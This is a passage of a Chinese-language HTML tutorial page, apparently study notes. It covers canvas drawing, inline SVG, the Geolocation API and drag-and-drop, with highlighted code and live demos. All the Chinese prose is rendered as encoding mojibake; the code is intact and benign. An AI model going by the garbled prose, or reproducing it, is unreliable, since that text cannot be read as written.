punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre><canvas id="myCanvas" width="200" height="100" style="border:1px solid #c3c3c3;">    Your browser does not support the canvas element.</canvas><script type="text/javascript">    var c=document.getElementById("myCanvas");    var cxt=c.getContext("2d");    cxt.moveTo(10,10);    cxt.lineTo(150,50);    cxt.lineTo(10,50);    cxt.stroke();</script><br><h3 id="ç»˜åˆ¶åœ†å½¢"><a href="#ç»˜åˆ¶åœ†å½¢" class="headerlink" title="ç»˜åˆ¶åœ†å½¢"></a>ç»˜åˆ¶åœ†å½¢</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myCanvas2<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">border</span><span class="token punctuation">:</span>1px solid #c3c3c3<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>    Your browser does not support the canvas element.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvas2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span><span class="token string">"#FF0000"</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">PI</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">closePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre><canvas id="myCanvas2" width="200" height="100" style="border:1px solid #c3c3c3;">    Your browser does not support the canvas element.</canvas><script type="text/javascript">var c=document.getElementById("myCanvas2");var cxt=c.getContext("2d");cxt.fillStyle="#FF0000";cxt.beginPath();cxt.arc(70,18,15,0,Math.PI*2,true);cxt.closePath();cxt.fill();</script><br><h3 id="ç»˜åˆ¶æ¸å˜èƒŒæ™¯"><a href="#ç»˜åˆ¶æ¸å˜èƒŒæ™¯" class="headerlink" title="ç»˜åˆ¶æ¸å˜èƒŒæ™¯"></a>ç»˜åˆ¶æ¸å˜èƒŒæ™¯</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myCanvas3<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">border</span><span class="token punctuation">:</span>1px solid #c3c3c3<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>    Your browser does not support the canvas element.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvas3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> grd<span class="token operator">=</span>cxt<span class="token punctuation">.</span><span class="token function">createLinearGradient</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">175</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    grd<span class="token punctuation">.</span><span class="token function">addColorStop</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"#FF0000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    grd<span class="token punctuation">.</span><span class="token function">addColorStop</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"#00FF00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>grd<span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">175</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre><canvas id="myCanvas3" width="200" height="100" style="border:1px solid #c3c3c3;">    Your browser does not support the canvas element.</canvas><script type="text/javascript">    var c=document.getElementById("myCanvas3");    var cxt=c.getContext("2d");    var grd=cxt.createLinearGradient(0,0,175,50);    grd.addColorStop(0,"#FF0000");    grd.addColorStop(1,"#00FF00");    cxt.fillStyle=grd;    cxt.fillRect(0,0,175,50);</script><br><h3 id="æ”¾ç½®å›¾åƒ"><a href="#æ”¾ç½®å›¾åƒ" class="headerlink" title="æ”¾ç½®å›¾åƒ"></a>æ”¾ç½®å›¾åƒ</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myCanvas4<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">border</span><span class="token punctuation">:</span>1px solid #c3c3c3<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>Your browser does not support the canvas element.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvas4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> img<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    img<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"FrontEnd_HTML_Advanced/start_again.jpg"</span>    cxt<span class="token punctuation">.</span><span class="token function">drawImage</span><span class="token punctuation">(</span>img<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre><canvas id="myCanvas4" width="200" height="200" style="border:1px solid #c3c3c3;">    Your browser does not support the canvas element.</canvas><script type="text/javascript">    var c=document.getElementById("myCanvas4");    var cxt=c.getContext("2d");    var img=new Image()    img.src="FrontEnd_HTML_Advanced/start_again.jpg"    cxt.drawImage(img,0,0);</script><br><hr><h2 id="å†…è”-SVG"><a href="#å†…è”-SVG" class="headerlink" title="å†…è” SVG"></a>å†…è” SVG</h2><p>SVG æŒ‡å¯ä¼¸ç¼©çŸ¢é‡å›¾å½¢ (Scalable Vector Graphics)ï¼Œç”¨äºå®šä¹‰ç”¨äºç½‘ç»œçš„åŸºäºçŸ¢é‡çš„å›¾å½¢ã€‚<br>SVG ä½¿ç”¨ XML æ ¼å¼å®šä¹‰å›¾å½¢ã€‚SVG å›¾åƒåœ¨æ”¾å¤§æˆ–æ”¹å˜å°ºå¯¸çš„æƒ…å†µä¸‹å…¶å›¾å½¢è´¨é‡ä¸ä¼šæœ‰æŸå¤±ã€‚<br>SVG æ˜¯ä¸‡ç»´ç½‘è”ç›Ÿçš„æ ‡å‡†ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>190<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>polygon</span> <span class="token attr-name">points</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100,10 40,180 190,60 10,60 160,180<span class="token punctuation">"</span></span>  <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">fill</span><span class="token punctuation">:</span>lime<span class="token punctuation">;</span><span class="token property">stroke</span><span class="token punctuation">:</span>purple<span class="token punctuation">;</span><span class="token property">stroke-width</span><span class="token punctuation">:</span>5<span class="token punctuation">;</span><span class="token property">fill-rule</span><span class="token punctuation">:</span>evenodd<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">&gt;</span></span></code></pre><svg xmlns="http://www.w3.org/2000/svg" version="1.1" height="190">  <polygon points="100,10 40,180 190,60 10,60 160,180" style="fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;"></polygon></svg><br><p>SVG æœ¬èº«å°±æŒºå¤æ‚çš„ï¼Œä¹Ÿå¾ˆå¼ºå¤§ï¼Œæœ‰ä¸“é—¨çš„æ•™ç¨‹æ¥å­¦è¿™ä¸ªã€‚</p><p>ä¸è¿‡ç›®å‰æ¥è¯´æˆ‘è¿˜ç”¨ä¸åˆ°å‘¢ï¼Œåé¢æ„Ÿå…´è¶£å†æ…¢æ…¢çœ‹å§ã€‚</p><hr><h2 id="Canvas-VS-SVG"><a href="#Canvas-VS-SVG" class="headerlink" title="Canvas VS SVG"></a>Canvas VS SVG</h2><h3 id="Canvas-1"><a href="#Canvas-1" class="headerlink" title="Canvas"></a>Canvas</h3><p>Canvas é€šè¿‡ <strong>JavaScript</strong> æ¥ç»˜åˆ¶ 2D å›¾å½¢ã€‚</p><p>Canvas <strong>é€åƒç´ è¿›è¡Œæ¸²æŸ“</strong>ã€‚</p><p>åœ¨ canvas ä¸­ï¼Œä¸€æ—¦å›¾å½¢è¢«ç»˜åˆ¶å®Œæˆï¼Œå®ƒå°±<strong>ä¸ä¼š</strong>ç»§ç»­å¾—åˆ°æµè§ˆå™¨çš„å…³æ³¨ã€‚</p><p>å¦‚æœå…¶ä½ç½®å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆ<strong>æ•´ä¸ªåœºæ™¯ä¹Ÿéœ€è¦é‡æ–°ç»˜åˆ¶</strong>ï¼ŒåŒ…æ‹¬ä»»ä½•æˆ–è®¸å·²è¢«å›¾å½¢è¦†ç›–çš„å¯¹è±¡ã€‚</p><ul><li>ä¾èµ–åˆ†è¾¨ç‡</li><li>ä¸æ”¯æŒäº‹ä»¶å¤„ç†å™¨</li><li>å¼±çš„æ–‡æœ¬æ¸²æŸ“èƒ½åŠ›</li><li>èƒ½å¤Ÿä»¥ .png æˆ– .jpg æ ¼å¼ä¿å­˜ç»“æœå›¾åƒ</li><li>æœ€é€‚åˆå›¾åƒå¯†é›†å‹çš„æ¸¸æˆï¼Œå…¶ä¸­çš„è®¸å¤šå¯¹è±¡ä¼šè¢«é¢‘ç¹é‡ç»˜</li></ul><h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>SVG æ˜¯ä¸€ç§ä½¿ç”¨ <strong>XML</strong> æè¿° 2D å›¾å½¢çš„è¯­è¨€ã€‚</p><p>SVG åŸºäº XMLï¼Œè¿™æ„å‘³ç€ SVG DOM ä¸­çš„<strong>æ¯ä¸ªå…ƒç´ éƒ½æ˜¯å¯ç”¨çš„</strong>ã€‚<strong>å¯ä»¥ä¸ºæŸä¸ªå…ƒç´ é™„åŠ  JavaScript äº‹ä»¶å¤„ç†å™¨ã€‚</strong></p><p>åœ¨ SVG ä¸­ï¼Œæ¯ä¸ªè¢«ç»˜åˆ¶çš„å›¾å½¢å‡è¢«è§†ä¸º<strong>å¯¹è±¡</strong>ã€‚å¦‚æœ SVG å¯¹è±¡çš„å±æ€§å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆæµè§ˆå™¨<strong>èƒ½å¤Ÿè‡ªåŠ¨é‡ç°å›¾å½¢</strong>ã€‚</p><ul><li>ä¸ä¾èµ–åˆ†è¾¨ç‡</li><li>æ”¯æŒäº‹ä»¶å¤„ç†å™¨</li><li>æœ€é€‚åˆå¸¦æœ‰å¤§å‹æ¸²æŸ“åŒºåŸŸçš„åº”ç”¨ç¨‹åºï¼ˆæ¯”å¦‚è°·æ­Œåœ°å›¾ï¼‰</li><li>å¤æ‚åº¦é«˜ä¼šå‡æ…¢æ¸²æŸ“é€Ÿåº¦ï¼ˆä»»ä½•è¿‡åº¦ä½¿ç”¨ DOM çš„åº”ç”¨éƒ½ä¸å¿«ï¼‰</li><li>ä¸é€‚åˆæ¸¸æˆåº”ç”¨</li></ul><hr><h2 id="åœ°ç†å®šä½"><a href="#åœ°ç†å®šä½" class="headerlink" title="åœ°ç†å®šä½"></a>åœ°ç†å®šä½</h2><p>HTML5 æä¾›äº†ä¸€ä¸ªè·å–ç”¨æˆ·ä½ç½®ä¿¡æ¯çš„APIã€‚</p><p>å½“ç„¶è¿™ä¸ªéœ€è¦ç”¨æˆ·çš„è®¸å¯æ‰è¡Œã€‚</p><p><code>getCurrentPosition()</code> æ–¹æ³•å¯ä»¥ç”¨æ¥è·å¾—ç”¨æˆ·çš„ä½ç½®ã€‚å¦‚æœèƒ½æ­£å¸¸è°ƒç”¨çš„è¯ï¼Œä¼šè¿”å›å¦‚ä¸‹ä¿¡æ¯ã€‚</p><table><thead><tr><th>å±æ€§</th><th>æè¿°</th></tr></thead><tbody><tr><td>coords.latitude</td><td>åè¿›åˆ¶æ•°çš„çº¬åº¦</td></tr><tr><td>coords.longitude</td><td>åè¿›åˆ¶æ•°çš„ç»åº¦</td></tr><tr><td>coords.accuracy</td><td>ä½ç½®ç²¾åº¦</td></tr><tr><td>coords.altitude</td><td>æµ·æ‹”ï¼Œæµ·å¹³é¢ä»¥ä¸Šä»¥ç±³è®¡</td></tr><tr><td>coords.altitudeAccuracy</td><td>ä½ç½®çš„æµ·æ‹”ç²¾åº¦</td></tr><tr><td>coords.heading</td><td>æ–¹å‘ï¼Œä»æ­£åŒ—å¼€å§‹ä»¥åº¦è®¡</td></tr><tr><td>coords.speed</td><td>é€Ÿåº¦ï¼Œä»¥ç±³/æ¯ç§’è®¡</td></tr><tr><td>timestamp</td><td>å“åº”çš„æ—¥æœŸ/æ—¶é—´</td></tr></tbody></table><p>å¦‚æœgetCurrentPosition()è¿è¡ŒæˆåŠŸï¼Œåˆ™å‘å‚æ•°showPositionä¸­è§„å®šçš„å‡½æ•°è¿”å›ä¸€ä¸ªcoordinateså¯¹è±¡ã€‚</p><p>showPosition() å‡½æ•°è·å¾—å¹¶æ˜¾ç¤ºç»åº¦å’Œçº¬åº¦ã€‚</p><p>getCurrentPosition() æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°ç”¨äº<strong>å¤„ç†é”™è¯¯</strong>ã€‚å®ƒè§„å®šå½“è·å–ç”¨æˆ·ä½ç½®å¤±è´¥æ—¶è¿è¡Œçš„å‡½æ•°ã€‚<em>ï¼ˆç±»ä¼¼äºå›è°ƒå‡½æ•°ï¼Ÿï¼‰</em></p><p>showError() å‡½æ•°ç”¨äºå¤„ç†é”™è¯¯ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>geolocation_demo<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>ç‚¹å‡»è¿™ä¸ªæŒ‰é’®ï¼Œå°†æ˜¾ç¤ºæ‚¨çš„åæ ‡ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getLocation()<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>è¯•ä¸€ä¸‹<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> x<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"geolocation_demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>geolocation<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            navigator<span class="token punctuation">.</span>geolocation<span class="token punctuation">.</span><span class="token function">getCurrentPosition</span><span class="token punctuation">(</span>showPosition<span class="token punctuation">,</span> showError<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"Geolocation is not supported by this browser."</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">showPosition</span><span class="token punctuation">(</span><span class="token parameter">position</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"Latitude: "</span> <span class="token operator">+</span> position<span class="token punctuation">.</span>coords<span class="token punctuation">.</span>latitude <span class="token operator">+</span>             <span class="token string">"&lt;br /&gt;Longitude: "</span> <span class="token operator">+</span> position<span class="token punctuation">.</span>coords<span class="token punctuation">.</span>longitude<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">showError</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>error<span class="token punctuation">.</span>code<span class="token punctuation">)</span>         <span class="token punctuation">{</span>            <span class="token keyword">case</span> error<span class="token punctuation">.</span><span class="token constant">PERMISSION_DENIED</span><span class="token operator">:</span>                x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"User denied the request for Geolocation."</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> error<span class="token punctuation">.</span><span class="token constant">POSITION_UNAVAILABLE</span><span class="token operator">:</span>                x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"Location information is unavailable."</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> error<span class="token punctuation">.</span><span class="token constant">TIMEOUT</span><span class="token operator">:</span>                x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"The request to get user location timed out."</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> error<span class="token punctuation">.</span><span class="token constant">UNKNOWN_ERROR</span><span class="token operator">:</span>                x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"An unknown error occurred."</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre><p id="geolocation_demo">ç‚¹å‡»è¿™ä¸ªæŒ‰é’®ï¼Œå°†æ˜¾ç¤ºæ‚¨çš„åæ ‡ï¼š</p><button onclick="getLocation()">è¯•ä¸€ä¸‹</button><script>    var x=document.getElementById("geolocation_demo");    function getLocation()    {        if (navigator.geolocation)        {            navigator.geolocation.getCurrentPosition(showPosition, showError);        }        else{x.innerHTML="Geolocation is not supported by this browser.";}    }    function showPosition(position)    {        x.innerHTML="Latitude: " + position.coords.latitude +             "<br />Longitude: " + position.coords.longitude;        }    function showError(error)    {        switch(error.code)         {            case error.PERMISSION_DENIED:                x.innerHTML="User denied the request for Geolocation."                break;            case error.POSITION_UNAVAILABLE:                x.innerHTML="Location information is unavailable."                break;            case error.TIMEOUT:                x.innerHTML="The request to get user location timed out."                break;            case error.UNKNOWN_ERROR:                x.innerHTML="An unknown error occurred."                break;        }    }</script><br><p>å¦‚éœ€<strong>åœ¨åœ°å›¾ä¸­æ˜¾ç¤ºç»“æœ</strong>ï¼Œå¯ä»¥è°ƒç”¨è°·æ­Œåœ°å›¾ã€ç™¾åº¦åœ°å›¾ç­‰åœ°å›¾çš„APIã€‚</p><p>è¿˜æœ‰ä¸€äº›å…¶ä»–çš„æ–¹æ³•ï¼š</p><p><strong>watchPosition()</strong> </p><p>è¿”å›ç”¨æˆ·çš„å½“å‰ä½ç½®ï¼Œå¹¶ç»§ç»­è¿”å›ç”¨æˆ·ç§»åŠ¨æ—¶çš„æ›´æ–°ä½ç½®ï¼ˆç±»ä¼¼äº GPSï¼‰ã€‚</p><p><strong>clearWatch()</strong> </p><p>åœæ­¢ watchPosition() æ–¹æ³•ã€‚</p><hr><h2 id="æ‹–æ”¾"><a href="#æ‹–æ”¾" class="headerlink" title="æ‹–æ”¾"></a>æ‹–æ”¾</h2><p>æ‹–æ”¾ï¼ˆDrag å’Œ Dropï¼‰æŒ‡çš„æ˜¯æŠ“å–æŸç‰©å¹¶æ‹–å…¥ä¸åŒçš„ä½ç½®ã€‚</p><p>HTML5 ä¸­ä»»ä½•å…ƒç´ éƒ½æ˜¯å¯æ‹–æ”¾çš„ã€‚</p><p><em>ï¼ˆè¿™é‡Œæˆ‘è¿˜ä¸æ˜¯å¾ˆæ˜ç™½ï¼Œåé¢å…·ä½“çœ‹çœ‹ JavaScript çš„æ—¶å€™å†å›æ¥çœ‹ä¸€çœ‹</em></p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">    <span class="token selector">#divmiao1</span> <span class="token punctuation">{</span><span class="token property">width</span><span class="token punctuation">:</span>200px<span class="token punctuation">;</span> <span class="token property">height</span><span class="token punctuation">:</span>200px<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span>10px<span class="token punctuation">;</span><span class="token property">border</span><span class="token punctuation">:</span>1px solid #aaaaaa<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">allowDrop</span><span class="token punctuation">(</span><span class="token parameter">ev</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ev<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">drag</span><span class="token punctuation">(</span><span class="token parameter">ev</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ev<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token string">"Text"</span><span class="token punctuation">,</span>ev<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">drop</span><span class="token punctuation">(</span><span class="token parameter">ev</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ev<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> data<span class="token operator">=</span>ev<span class="token punctuation">.</span>dataTransfer<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">"Text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ev<span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>è¯·æŠŠå›¾ç‰‡æ‹–æ”¾åˆ°çŸ©å½¢ä¸­ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>divmiao1<span class="token punctuation">"</span></span> <span class="token attr-name">ondrop</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>drop(event)<span class="token punctuation">"</span></span> <span class="token attr-name">ondragover</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token 